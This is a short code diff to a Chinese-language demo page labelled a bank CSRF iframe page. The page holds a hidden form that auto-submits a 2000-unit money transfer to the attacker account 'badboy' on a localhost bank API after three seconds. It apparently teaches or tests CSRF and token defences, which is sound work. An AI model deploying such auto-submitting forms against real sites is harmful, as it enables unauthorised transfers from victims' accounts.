@@ -6,15 +6,16 @@
   <title>银行 csrf iframe 页面</title>
 </head>
 <body>
-  <form id="form" action="http://localhost:3001/api/transfer_money"  method="post">
+  <h1>3 秒后自动转账</h1>
+  <form id="form" action="http://localhost:3000/api/transfer_money_with_token"  method="post">
     <input name="username" value="badboy"/>
-    <input name="money" value="100"/>
+    <input name="money" value="2000"/>
   </form>
   <script>
   </script>
-  <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.js"></script>
+  <script src="/js/jquery.js"></script>
   <script>
-    // 三秒
+    // 3秒后提交表单
     setTimeout(function() {
       $('#form').submit();
     }, 3000);
